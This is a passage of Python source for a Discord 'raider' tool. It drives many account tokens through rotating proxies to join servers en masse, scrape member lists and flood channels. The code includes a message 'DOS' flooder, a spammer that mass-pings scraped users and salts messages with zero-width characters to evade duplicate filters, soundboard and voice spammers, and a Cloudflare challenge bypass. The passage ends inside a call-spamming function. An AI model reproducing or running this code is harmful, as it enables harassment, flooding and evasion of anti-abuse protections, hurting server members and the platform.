                # Content padding: 1 space + 77 chars + 1 space = 79 chars inside
                content = line[:77].ljust(77)
                print(f"{self.background}│{Fore.RESET} {color}{content}{Fore.RESET} {self.background}│{Fore.RESET}")
        print(f"{self.background}╰───────────────────────────────────────────────────────────────────────────────╯{Fore.RESET}")
        print(f"{'«~» Credits   «?» Tokens   «!» Proxies   «h» Guide'.center(self.size)}")
    def run(self):
        self.render_ascii()
        self.raider_options()


    def log(self, text=None, color=None, token=None, log=None):
        response = f"{Fore.RESET}[{datetime.now().strftime(f'{Fore.LIGHTBLACK_EX}%H:%M:%S{Fore.RESET}')}] "
        if text:
            response += f"[{color}{text}{C['white']}] "
        if token:
            response += token
        if log:
            response += f" ({C['gray']}{log}{C['white']})"

        with self.print_lock:
            print(response)

    def prompt(self, text, ask=None):
        prompted = f"[{C[color]}{text}{C['white']}]"
        if ask:
            prompted += f" {C['gray']}(y/n){C['white']}: "
        else:
            prompted += ": "
            
        return prompted

console = Render()

# Big Thanks to Aniell4 for the scraper
class Utils:
    @staticmethod
    def range_corrector(ranges):
        if [0, 99] not in ranges:
            ranges.insert(0, [0, 99])
        return ranges

    @staticmethod
    def get_ranges(index, multiplier, member_count):
        initial_num = index * multiplier
        ranges = [[initial_num, initial_num + 99]]
        if member_count > initial_num + 99:
            ranges.append([initial_num + 100, initial_num + 199])
        return Utils.range_corrector(ranges)

    @staticmethod
    def parse_member_list_update(response):
        data = response["d"]
        member_data = {
            "online_count": data["online_count"],
            "member_count": data["member_count"],
            "id": data["id"],
            "guild_id": data["guild_id"],
            "hoisted_roles": data["groups"],
            "types": [op["op"] for op in data["ops"]],
            "locations": [],
            "updates": [],
        }

        for chunk in data["ops"]:
            op_type = chunk["op"]
            if op_type in {"SYNC", "INVALIDATE"}:
                member_data["locations"].append(chunk["range"])
                member_data["updates"].append(chunk["items"] if op_type == "SYNC" else [])
            elif op_type in {"INSERT", "UPDATE", "DELETE"}:
                member_data["locations"].append(chunk["index"])
                member_data["updates"].append(chunk["item"] if op_type != "DELETE" else [])

        return member_data

class DiscordSocket(websocket.WebSocketApp):
    def __init__(self, token, guild_id, channel_id):
        self.token = token
        self.guild_id = guild_id
        self.channel_id = channel_id
        self.blacklisted_ids = {"1100342265303547924", "1190052987477958806", "833007032000446505", "1273658880039190581", "1308012310396407828", "1326906424873193586", "1334512667456442411", "1349869929809186846"}

        headers = {
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9",
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
            "Sec-WebSocket-Extensions": "permessage-deflate; client_max_window_bits",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
        }

        super().__init__(
            "wss://gateway.discord.gg/?encoding=json&v=9",
            header=headers,
            on_open=self.on_open,
            on_message=self.on_message,
            on_close=self.on_close,
        )

        self.end_scraping = False
        self.guilds = {}
        self.members = {}
        self.ranges = [[0, 0]]
        self.last_range = 0
        self.packets_recv = 0

    def run(self):
        self.run_forever()
        return self.members

    def scrape_users(self):
        if not self.end_scraping:
            self.send(json.dumps({
                "op": 14,
                "d": {
                    "guild_id": self.guild_id,
                    "typing": True,
                    "activities": True,
                    "threads": True,
                    "channels": {self.channel_id: self.ranges}
                }
            }))

    def on_open(self, ws):
        self.send(json.dumps({
            "op": 2,
            "d": {
                "token": self.token,
                "capabilities": 125,
                "properties": {
                    "os": "Windows",
                    "browser": "Chrome",
                    "device": "",
                    "system_locale": "it-IT",
                    "browser_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
                    "browser_version": "138.0.0.0",
                    "os_version": "10",
                    "referrer": "",
                    "referring_domain": "",
                    "referrer_current": "",
                    "referring_domain_current": "",
                    "release_channel": "stable",
                    "client_build_number": 419434,
                    "client_event_source": None
                },
                "presence": {
                    "status": "online",
                    "since": 0,
                    "activities": [],
                    "afk": False
                },
                "compress": False,
                "client_state": {
                    "guild_hashes": {},
                    "highest_last_message_id": "0",
                    "read_state_version": 0,
                    "user_guild_settings_version": -1,
                    "user_settings_version": -1
                }
            }
        }))

    def heartbeat_thread(self, interval):
        while not self.end_scraping:
            self.send(json.dumps({"op": 1, "d": self.packets_recv}))
            time.sleep(interval)

    def on_message(self, ws, message):
        decoded = json.loads(message)
        if not decoded:
            return

        self.packets_recv += decoded["op"] != 11

        if decoded["op"] == 10:
            threading.Thread(
                target=self.heartbeat_thread,
                args=(decoded["d"]["heartbeat_interval"] / 1000,),
                daemon=True,
            ).start()

        if decoded["t"] == "READY":
            self.guilds.update({
                guild["id"]: {"member_count": guild["member_count"]}
                for guild in decoded["d"]["guilds"]
            })

            total_members = self.guilds[self.guild_id]["member_count"]

            console.log("Info", C["yellow"], False, f"Guild has {total_members} members → ETA ~{round(total_members / 150, 1)}s")

        if decoded["t"] == "READY_SUPPLEMENTAL":
            self.ranges = Utils.get_ranges(0, 100, self.guilds[self.guild_id]["member_count"])
            self.scrape_users()

        elif decoded["t"] == "GUILD_MEMBER_LIST_UPDATE":
            parsed = Utils.parse_member_list_update(decoded)
            if parsed["guild_id"] == self.guild_id:
                self.process_updates(parsed)

    def process_updates(self, parsed):
        if "SYNC" in parsed["types"] or "UPDATE" in parsed["types"]:
            for i, update_type in enumerate(parsed["types"]):
                if update_type in {"SYNC", "UPDATE"}:
                    if not parsed["updates"][i]:
                        self.end_scraping = True
                        break
                    self.process_members(parsed["updates"][i])

                self.last_range += 1
                self.ranges = Utils.get_ranges(self.last_range, 100, self.guilds[self.guild_id]["member_count"])
                self.scrape_users()

        if self.end_scraping:
            self.close()

    def process_members(self, updates):
        for item in updates:
            member = item.get("member")
            if member:
                user = member.get("user", {})
                user_id = user.get("id")
                if user_id and user_id not in self.blacklisted_ids and not user.get("bot"):
                    self.members[user_id] = {
                        "tag": f"{user.get('username')}#{user.get('discriminator')}",
                        "id": user_id,
                    }

    def on_close(self, ws, close_code, close_msg):
        console.log("Success", C["green"], False, f"Scraped {len(self.members)} members")

def scrape(token, guild_id, channel_id):
    sb = DiscordSocket(token, guild_id, channel_id)
    return sb.run()
    
class Raider:
    def __init__(self):
        self.build_number = 429117
        self.cf_token = self.get_cloudflare_cookies()
        self.cookies, self.fingerprint = self.get_discord_cookies()
        self.ws = websocket.WebSocket()

    def get_cloudflare_cookies(self):
        try:
            response = req_session.get(
                "https://discord.com/channels/@me",
                headers={
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.9",
                }
            )

            challange = re.sub(r".*r:'([^']+)'.*", r"\1", response.text, flags=re.DOTALL)
            build_number = re.sub(r'.*"BUILD_NUMBER":"(\d+)".*', r'\1', response.text, flags=re.DOTALL)
            if build_number is not None:
                self.build_number = build_number

            cf_token = req_session.post(f'https://discord.com/cdn-cgi/challenge-platform/h/b/jsd/r/{random.random():.16f}:{str(int(time.time()))}:{secrets.token_urlsafe(32)}/{challange}')
            if cf_token.status_code == 200:
                cookie = list(cf_token.cookies)[0]
                return f"{cookie.name}={cookie.value}"
            else:
                return None
        except:
            return None

    def get_discord_cookies(self):
        try:
            response = req_session.get(
                'https://discord.com/api/v9/experiments',
            )
            if response and response.status_code == 200:
                return "; ".join(
                    [f"{cookie.name}={cookie.value}" for cookie in response.cookies]
                ) + f"; {self.cf_token}; locale=en-US", response.json()["fingerprint"]
            else:
                console.log("ERROR", C["red"], "Failed to get cookies using Static")
                return "__dcfduid=62f9e16000a211ef8089eda5bffbf7f9; __sdcfduid=62f9e16100a211ef8089eda5bffbf7f98e904ba04346eacdf57ee4af97bdd94e4c16f7df1db5132bea9132dd26b21a2a; __cfruid=a2ccd7637937e6a41e6888bdb6e8225cd0a6f8e0-1714045775; _cfuvid=s_CLUzmUvmiXyXPSv91CzlxP00pxRJpqEhuUgJql85Y-1714045775095-0.0.1.1-604800000; locale=en-US"
        except Exception as e:
            console.log("ERROR", C["red"], "get_discord_cookies", e)

    def super_properties(self):
        try:
            payload = {
                "os": "Windows",
                "browser": "Chrome",
                "release_channel": "stable",
                "os_version": "10",
                "system_locale": "pl",
                "browser_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36 Edg/139.0.0.0",
                "browser_version": "139.0.0.0",
                "client_build_number": int(self.build_number),
                "client_launch_id": str(uuid.uuid4()),
                "client_heartbeat_session_id": str(uuid.uuid4()),
                "launch_signature": str(uuid.uuid4()),
                "client_event_source": None,
            }
            properties = base64.b64encode(json.dumps(payload).encode()).decode()
            return properties
        except Exception as e:
            console.log("ERROR", C["red"], "get_super_properties", e)

    def headers(self, token):
        return {
            "authority": "discord.com",
            "accept": "*/*",
            "accept-language": "en",
            "authorization": token,
            "cookie": self.cookies,
            "content-type": "application/json",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36 Edg/139.0.0.0",
            "x-discord-locale": "en-US",
            "x-debug-options": "bugReporterEnabled",
            "x-fingerprint": self.fingerprint,
            "x-super-properties": self.super_properties(),
        }
    
    def nonce(self):
        return int(time.time() * 1000) - 1420070400000 << 22

    def request(self, method, url, token=None, **kwargs):
        """Elite Networking Wrapper with 429 Handling & Proxy Rotation"""
        attempts = 0
        max_attempts = 3 if proxies else 1
        
        while attempts < max_attempts and not STRIKE_EVENT.is_set():
            attempts += 1
            if not proxies or len(proxies) == 0:
                proxy_url = None
            else:
                p = random.choice(proxies)
                proxy_url = p if "://" in p else f"http://{p}"
                
            try:
                headers = self.headers(token) if token else {
                    "authority": "discord.com",
                    "accept": "*/*",
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36"
                }
                if "headers" in kwargs:
                    headers.update(kwargs.pop("headers"))
                
                res = req_session.request(method=method, url=url, headers=headers, proxy=proxy_url, timeout=5, **kwargs)
                
                if res.status_code == 429:
                    retry_after = res.json().get("retry_after", 1)
                    time.sleep(retry_after)
                    continue
                return res
            except Exception as e:
                if proxies:
                    console.log("RETRY", C["yellow"], f"Proxy {proxy_url[:30]}...", f"Attempt {attempts}/{max_attempts} - {str(e)[:40]}")
                continue
    
        # NUCLEAR FALLBACK: Direct Connection (No Proxy)
        if not STRIKE_EVENT.is_set():
            try:
                headers = self.headers(token) if token else {"authority": "discord.com", "accept": "*/*", "user-agent": "Mozilla/5.0"}
                res = req_session.request(method=method, url=url, headers=headers, proxy=None, timeout=10, **kwargs)
                if res and res.status_code != 0: return res
            except:
                pass
        
        # Return a Dummy Response to prevent crashes in callers
        class DeadResponse:
            def __init__(self, err):
                self.status_code = 0
                self.text = str(err)
            def json(self): return {"message": "All Proxies Failed & Direct Fallback Blocked (Conn Error)"}
        return DeadResponse("Conn Error")

    def joiner(self, invite):
        """MEGA-UPGRADED JOINER with 8 advanced features"""
        try:
            console.log("INTEL", C["aqua"], f"Resolving Invite Code: {invite}")
            
            # Statistics tracking
            stats = {
                "total": len(tokens),
                "success": 0,
                "failed": 0,
                "captcha": 0,
                "already_joined": 0
            }
            
            # Feature 1: Invite Validation & Server Preview
            invite_info = None
            
            # Try guest API first (less flagged)
            res = self.request("GET", f"https://discord.com/api/v9/invites/{invite}?with_counts=true&with_expiration=true")
            if res and res.status_code == 200:
                invite_info = res.json()
                
                # Display server preview
                guild_name = invite_info['guild']['name']
                guild_id = invite_info['guild']['id']
                member_count = invite_info.get('approximate_member_count', 'Unknown')
                online_count = invite_info.get('approximate_presence_count', 'Unknown')
                expires_at = invite_info.get('expires_at', 'Never')
                
                console.log("SERVER PREVIEW", C["cyan"], "═" * 50)
                console.log("NAME", C["white"], guild_name)
                console.log("ID", C["gray"], guild_id)
                console.log("MEMBERS", C["green"], f"{member_count} total | {online_count} online")
                console.log("EXPIRES", C["yellow"], expires_at if expires_at != "Never" else "Never")
                console.log("VERIFICATION", C["magenta"], str(invite_info['guild'].get('verification_level', 'Unknown')))
                console.log("═" * 60, C["cyan"])
                
                # Feature 2: Invite Validation
                if expires_at and expires_at != "Never":
                    from datetime import datetime
                    try:
                        expiry = datetime.fromisoformat(expires_at.replace('Z', '+00:00'))
                        if expiry < datetime.now(expiry.tzinfo):
                            console.log("ERROR", C["red"], "Invite Expired", "Cannot join")
                            time.sleep(5)  # Give user time to read error
                            return
                    except:
                        pass
                
                console.log("SCOUT", C["green"], f"Invite Validated: {guild_name}")
            
            # Token fallback
            if not invite_info:
                for token in tokens[:3]:  # Try first 3 tokens
                    res = self.request("GET", f"https://discord.com/api/v9/invites/{invite}?with_counts=true", token)
                    if res and res.status_code == 200:
                        invite_info = res.json()
                        break
                    elif res and res.status_code == 404:
                        console.log("Failed", C["red"], "Invite Invalid (404)")
                        time.sleep(5)  # Give user time to read error
                        return
                    elif res:
                        console.log("WARN", C["yellow"], f"{token[:15]}...", f"Status: {res.status_code}")

            if not invite_info:
                console.log("Failed", C["red"], "Invite Resolution Failure. All proxies/tokens/guest-api failed.")
                time.sleep(5)  # Give user time to read error
                return

            guild_name = invite_info["guild"]["name"]
            guild_id = invite_info["guild"]["id"]
            verification_level = invite_info['guild'].get('verification_level', 0)
            
            context = base64.b64encode(json.dumps({
                "location": "Join Guild",
                "location_guild_id": guild_id,
                "location_channel_id": invite_info["channel"]["id"],
                "location_channel_type": invite_info["channel"]["type"]
            }).encode()).decode()

            def task(token):
                """Enhanced join task with retry logic and auto-bypass"""
                max_retries = 3
                retry_count = 0
                
                while retry_count < max_retries:
                    try:
                        # No delay - instant join attempt for maximum speed
                        headers = {"X-Context-Properties": context}
                        payload = {"session_id": uuid.uuid4().hex}
                        
                        res = self.request("POST", f"https://discord.com/api/v9/invites/{invite}", token, headers=headers, json=payload)
                        
                        # DEBUG: Log response details
                        if res:
                            console.log("DEBUG", C["cyan"], f"Status: {res.status_code}", f"Token: {token[:15]}...")
                            try:
                                response_data = res.json()
                                console.log("DEBUG", C["cyan"], "Response", str(response_data)[:100])
                            except:
                                console.log("DEBUG", C["cyan"], "Response", "No JSON data")
                        else:
                            console.log("DEBUG", C["red"], "No Response", f"Token: {token[:15]}...")
                        
                        if res and res.status_code == 200:
                            # Trust Discord API - if 200, join successful
                            stats["success"] += 1
                            console.log("Joined", C["green"], f"{token[:25]}...", guild_name)
                            
                            # Feature 4: Auto-Accept Rules (if verification required)
                            if verification_level > 0:
                                time.sleep(0.2)  # Minimal delay
                                self.accept_rules(guild_id, token)
                            
                            break  # Success, exit retry loop
                            
                        elif res and res.status_code == 400:
                            error_data = res.json()
                            if "captcha" in str(error_data).lower():
                                stats["captcha"] += 1
                                console.log("Captcha", C["yellow"], f"{token[:25]}...", "Requires Captcha")
                                break  # Don't retry on captcha
                            else:
                                retry_count += 1
                                if retry_count < max_retries:
                                    console.log("RETRY", C["yellow"], f"{token[:25]}...", f"Attempt {retry_count + 1}/{max_retries}")
                                    time.sleep(retry_count * 1)  # Reduced backoff from 2x to 1x
                                else:
                                    stats["failed"] += 1
                                    console.log("Failed", C["red"], f"{token[:25]}...", error_data.get("message", "Error"))
                                    
                        elif res and res.status_code == 204:
                            stats["already_joined"] += 1
                            console.log("Already", C["gray"], f"{token[:25]}...", "Already in server")
                            break
                            
                        else:
                            retry_count += 1
                            if retry_count < max_retries:
                                console.log("RETRY", C["yellow"], f"{token[:25]}...", f"Attempt {retry_count + 1}/{max_retries}")
                                time.sleep(retry_count * 1)  # Reduced backoff
                            else:
                                stats["failed"] += 1
                                if res:
                                    try:
                                        error_msg = res.json().get("message", f"HTTP {res.status_code}")
                                    except:
                                        error_msg = f"HTTP {res.status_code}"
                                    console.log("Failed", C["red"], f"{token[:25]}...", error_msg)
                                else:
                                    console.log("Failed", C["red"], f"{token[:25]}...", "No Response (Token dead or network issue)")
                                
                    except Exception as e:
                        retry_count += 1
                        if retry_count >= max_retries:
                            stats["failed"] += 1
                            console.log("Error", C["red"], f"{token[:25]}...", str(e))
                        else:
                            time.sleep(retry_count * 1)  # Reduced backoff


            # Use ThreadPoolExecutor directly for better performance
            console.log("EXECUTING", C["rose"], f"Joining with {len(tokens)} tokens", "Max 10 threads")
            
            with ThreadPoolExecutor(max_workers=min(10, len(tokens))) as executor:
                futures = [executor.submit(task, token) for token in tokens]
                for future in futures:
                    try:
                        future.result(timeout=30)  # 30 sec timeout per token
                    except Exception as e:
                        error_type = type(e).__name__
                        console.log("ERROR", C["red"], "Thread Task Failed", f"[{error_type}] {str(e)}")
            
            # Feature 6: Statistics Display
            console.log("STATISTICS", C["cyan"], "═" * 50)
            console.log("TOTAL", C["white"], str(stats["total"]))
            console.log("SUCCESS", C["green"], str(stats["success"]))
            console.log("FAILED", C["red"], str(stats["failed"]))
            console.log("CAPTCHA", C["yellow"], str(stats["captcha"]))
            console.log("ALREADY JOINED", C["gray"], str(stats["already_joined"]))
            success_rate = (stats["success"] / stats["total"] * 100) if stats["total"] > 0 else 0
            console.log("SUCCESS RATE", C["cyan"], f"{success_rate:.1f}%")
            console.log("═" * 60, C["cyan"])
            
        except Exception as e:
            console.log("Error", C["red"], "Joiner Failure", str(e))
            time.sleep(5)  # Give user time to read error

    def leaver(self, token, guild):
        """UPGRADED LEAVER with batch operations and whitelist"""
        try:
            # Feature 1: Delay Randomization
            delay = random.uniform(0.3, 1.5)
            time.sleep(delay)
            
            res = self.request("DELETE", f"https://discord.com/api/v9/users/@me/guilds/{guild}", token, json={"lurking": False})
            if res and res.status_code == 204:
                console.log("Left", C["green"], f"{token[:25]}...", f"Server ID: {guild}")
                return True
            else:
                msg = res.json().get("message", "Error") if res else "No Response"
                console.log("Failed", C["red"], f"{token[:25]}...", msg)
                return False
        except Exception as e:
            console.log("Error", C["red"], f"{token[:25]}...", str(e))
            return False
    
    def leave_all_servers(self, token, whitelist=None):
        """Feature 2: Leave all servers with whitelist support"""
        try:
            # Get all guilds
            res = self.request("GET", "https://discord.com/api/v9/users/@me/guilds", token)
            if not res or res.status_code != 200:
                console.log("ERROR", C["red"], "Failed to fetch guilds")
                return
            
            guilds = res.json()
            whitelist = whitelist or []
            
            stats = {"total": len(guilds), "left": 0, "skipped": 0, "failed": 0}
            
            console.log("FOUND", C["cyan"], f"{len(guilds)} servers")
            
            for guild in guilds:
                guild_id = guild["id"]
                guild_name = guild["name"]
                
                # Feature 3: Whitelist check
                if guild_id in whitelist or guild_name in whitelist:
                    console.log("SKIP", C["yellow"], guild_name, "Whitelisted")
                    stats["skipped"] += 1
                    continue
                
                if self.leaver(token, guild_id):
                    stats["left"] += 1
                else:
                    stats["failed"] += 1
                
                time.sleep(random.uniform(1, 3))
            
            # Feature 4: Statistics
            console.log("STATISTICS", C["cyan"], "═" * 50)
            console.log("TOTAL", C["white"], str(stats["total"]))
            console.log("LEFT", C["green"], str(stats["left"]))
            console.log("SKIPPED", C["yellow"], str(stats["skipped"]))
            console.log("FAILED", C["red"], str(stats["failed"]))
            
        except Exception as e:
            console.log("Error", C["red"], "Leave All Failed", str(e))

    def get_token_info(self, token):
        """Fetch username and status of a token with stable fallback"""
        # Cleanup token just in case
        token = token.strip().replace('"', '').replace("'", "")
        
        headers = {
            "Authorization": token,
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        }
        
        try:
            # First try: Direct Request (No Proxy) - Most reliable for info check
            res = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=10)
            if res.status_code == 200:
                data = res.json()
                return f"{data['username']}#{data.get('discriminator', '0000')}"
            else:
                # Log the exact status for debugging
                log_status = f"HTTP {res.status_code}"
                if res.status_code == 401: log_status = "Invalid/Expired"
                elif res.status_code == 403: log_status = "Locked/Verification"
                return f"Faulty: {log_status}"

            return f"Unknown ({res.status_code if res else 'Fail'})"
        except Exception as e:
            return f"Conn Error ({str(e)[:10]})"

    def dos_flooder(self, token, channel, message, threads=5):
        """Intense API Flooding Mode (DOS)"""
        while not STRIKE_EVENT.is_set():
            try:
                payload = {
                    "content": message + " " + uuid.uuid4().hex[:5], 
                    "nonce": str(self.nonce()), 
                    "tts": False
                }
                res = self.request("POST", f"https://discord.com/api/v9/channels/{channel}/messages", token, json=payload)
                # Zero delay for DOS mode unless rate-limited
                if res and res.status_code == 429:
                    time.sleep(res.json().get('retry_after', 0.5))
            except:
                time.sleep(0.1)

    def spammer(self, token, channel, message=None, guild=None, massping=None, pings=None, random_str=None, delay=None, use_embed=False, reply_to=None, auto_delete=False):
        """MEGA-UPGRADED SPAMMER with 6 advanced features"""
        ghost_chars = ["\u200b", "\u200c", "\u200d", "\u200e", "\u200f"]
        
        # Feature 1: Message Templates Library
        templates = {
            "promo": "🎉 **SPECIAL OFFER** 🎉\n{message}\n✨ Don't miss out!",
            "announcement": "📢 **ANNOUNCEMENT** 📢\n{message}",
            "warning": "⚠️ **WARNING** ⚠️\n{message}",
            "info": "ℹ️ **INFORMATION** ℹ️\n{message}",
            "custom": "{message}"
        }
        
        msg_count = 0
        
        while not STRIKE_EVENT.is_set():
            try:
                # Feature 2: Typing Indicator Simulation
                try:
                    self.request("POST", f"https://discord.com/api/v9/channels/{channel}/typing", token)
                    time.sleep(random.uniform(0.5, 1.5))
                except:
                    pass
                
                # Ghost Bypass Injection
                content = f"{message}"
                if massping:
                    content += f" {self.get_random_members(guild, int(pings))}"
                
                # Dynamic Salt to bypass 'Same message' filters
                salt = "".join(random.choices(ghost_chars, k=5)) + uuid.uuid4().hex[:6]
                content = f"{content} {salt}"
                
                # Feature 3: Embed Message Support
                payload = {
                    "content": content if not use_embed else "",
                    "nonce": str((int(time.time() * 1000) - 1420070400000) * 4194304),
                    "tts": False,
                    "flags": 0
                }
                
                if use_embed:
                    payload["embeds"] = [{
                        "title": "📨 Message",
                        "description": content,
                        "color": random.randint(0, 0xFFFFFF),
                        "footer": {"text": f"Sent at {time.strftime('%H:%M:%S')}"}
                    }]
                
                # Feature 4: Reply/Thread Support
                if reply_to:
                    payload["message_reference"] = {
                        "message_id": reply_to,
                        "channel_id": channel
                    }
                
                res = self.request("POST", f"https://discord.com/api/v9/channels/{channel}/messages", token, json=payload)
                
                if res and res.status_code == 200:
                    msg_count += 1
                    msg_data = res.json()
                    msg_id = msg_data.get("id")
                    
                    console.log("Sent", C["green"], f"{token[:25]}...", f"Message #{msg_count}")
                    
                    # Feature 5: Auto-Delete After Spam
                    if auto_delete and msg_id:
                        time.sleep(random.uniform(2, 5))
                        try:
                            self.request("DELETE", f"https://discord.com/api/v9/channels/{channel}/messages/{msg_id}", token)
                            console.log("Deleted", C["gray"], f"{token[:25]}...", f"Message #{msg_count}")
                        except:
                            pass
                    
                elif res and res.status_code == 429:
                    retry_after = res.json().get('retry_after', 1)
                    console.log("Limit", C["yellow"], f"{token[:25]}...", f"Rate-Limited ({retry_after}s)")
                    time.sleep(retry_after)
                elif res and res.status_code == 403:
                    console.log("Lock", C["rose"], f"{token[:25]}...", "No Access/Blocked")
                    break
                
                if delay: time.sleep(delay)
                else: time.sleep(0.1)  # Hyper-Aggressive baseline
                
            except Exception as e:
                console.log("Error", C["red"], f"{token[:25]}...", str(e)[:30])
                time.sleep(1)
    
    def spam_with_attachment(self, token, channel, message, file_path):
        """Feature 6: Image/File Attachment Support"""
        try:
            import requests
            
            # Upload file to Discord CDN
            with open(file_path, 'rb') as f:
                files = {'file': f}
                data = {
                    'content': message,
                    'tts': False
                }
                
                headers = {
                    'Authorization': token
                }
                
                res = requests.post(
                    f"https://discord.com/api/v9/channels/{channel}/messages",
                    headers=headers,
                    data=data,
                    files=files
                )
                
                if res.status_code == 200:
                    console.log("Sent", C["green"], "Attachment", f"File: {file_path}")
                    return True
                else:
                    console.log("Failed", C["red"], "Attachment", res.status_code)
                    return False
                    
        except Exception as e:
            console.log("Error", C["red"], "Attachment", str(e))
            return False

    def member_scrape(self, guild_id, channel_id):
        try:
            in_guild = []

            if not os.path.exists(f"scraped/{guild_id}.json"):
                for token in tokens:
                    response = self.request(
                        "GET",
                        f"https://discord.com/api/v9/guilds/{guild_id}",
                        token
                    )

                    if response.status_code == 200:
                        in_guild.append(token)
                        break

                if not in_guild:
                    console.log("Failed", C["red"], "Missing Access")
                token = random.choice(in_guild)
                members = scrape(token, guild_id, channel_id)

                with open(f"scraped/{guild_id}.json", "w") as f:
                    json.dump(list(members.keys()), f, indent=2)
        except Exception as e:
            console.log("Failed", C["red"], False, e)

    def get_random_members(self, guild_id, count):
        try:
            with open(f"scraped/{guild_id}.json") as f:
                members = json.load(f)

            message = ""
            for _ in range(int(count)):
                message += f"<@!{random.choice(members)}>"
            return message
        except Exception as e:
            console.log("Failed", C["red"], "Failed to get Random Members", e)

    def voice_spammer(self, token, ws, guild_id, channel_id, close=None):
        try:
            self.onliner(token, ws)
            ws.send(
                json.dumps(
                    {
                        "op": 4,
                        "d": {
                            "guild_id": guild_id,
                            "channel_id": channel_id,
                            "self_mute": False,
                            "self_deaf": False,
                            "self_stream": False,
                            "self_video": True,
                        },
                    }
                )
            )

            ws.send(
                json.dumps(
                    {
                        "op": 18,
                        "d": {
                            "type": "guild",
                            "guild_id": guild_id,
                            "channel_id": channel_id,
                            "preferred_region": "singapore",
                        },
                    }
                )
            )
            
            ws.send(json.dumps({"op": 1, "d": None}))
            if close:
                ws.close()
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def vc_joiner(self, token, guild, channel, ws):
        try:
            for _ in range(1):
                ws.connect("wss://gateway.discord.gg/?v=9&encoding=json")
                ws.send(json.dumps({
                    "op": 2,
                    "d": {
                        "token": token,
                        "properties": {
                            "os": "windows",
                            "browser": "Discord",
                            "device": "desktop"
                        }
                    }
                }))

                ws.send(json.dumps({
                    "op": 4,
                    "d": {
                        "guild_id": guild,
                        "channel_id": channel,
                        "self_mute": random.choice([True, False]),
                        "self_deaf": False
                    }
                }))
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def onliner(self, token, ws):
        try:
            ws.connect("wss://gateway.discord.gg/?v=9&encoding=json")
            ws.send(
                json.dumps(
                    {
                        "op": 2,
                        "d": {
                            "token": token,
                            "properties": {
                                "os": "Windows",
                            },
                            "presence": {
                                "game": {
                                    "name": "ASTRO-NEXUS",
                                    "type": 0,
                                },
                                "status": random.choice(['online', 'dnd', 'idle']),
                                "since": 0,
                                "afk": False
                            }
                        },
                    }
                )
            )

            console.log("Onlined", C[color], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def join_voice_channel(self, token, guild_id, channel_id):
        ws = websocket.WebSocket()

        def check_for_guild(token):
            response = req_session.get(
                f"https://discord.com/api/v9/guilds/{guild_id}", 
                headers=self.headers(token)
            )
            if response and response.status_code == 200:
                return True
            else:
                return False

        def check_for_channel(token):
            if check_for_guild(token):
                response = req_session.get(
                    f"https://discord.com/api/v9/channels/{channel_id}", 
                    headers=self.headers(token)
                )

                if response and response.status_code == 200:
                    return True
                else:
                    return False

        if check_for_channel(token):
            console.log("Joined", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
            self.vc_joiner(token, guild_id, channel_id, ws)
        else:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")

    def soundbord(self, token, channel):
        try:
            sounds = req_session.get(
                "https://discord.com/api/v9/soundboard-default-sounds",
                headers=self.headers(token)
            ).json()

            time.sleep(1)

            while not STRIKE_EVENT.is_set():
                sound = random.choice(sounds)

                payload = {
                    "emoji_id": None,
                    "emoji_name": sound["emoji_name"],
                    "sound_id": sound["sound_id"],
                }

                response = req_session.post(
                    f"https://discord.com/api/v9/channels/{channel}/send-soundboard-sound", 
                    headers=self.headers(token), 
                    json=payload,
                )

                if response.status_code == 204:
                    console.log("Success", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"Played {sound['name']}")
                elif response.status_code == 429:
                    retry_after = response.json()["retry_after"] + random.uniform(0.1, 0.5)
                    console.log("Ratelimit", C["yellow"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"Ratelimit Exceeded - {retry_after:.2f}s",)
                    time.sleep(float(retry_after))
                else:
                    break
                time.sleep(random.uniform(0.56, 0.75))
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def open_dm(self, token, user_id):
        try:
            payload = {
                "recipients": [f'{user_id}'],
            }

            response = self.request(
                "POST",
                "https://discord.com/api/v9/users/@me/channels",
                token,
                json=payload
            )

            if response.status_code == 200:
                return response.json()["id"]
            else:
                console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
                return
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def call_spammer(self, token, user_id):
        try:
            while not STRIKE_EVENT.is_set():
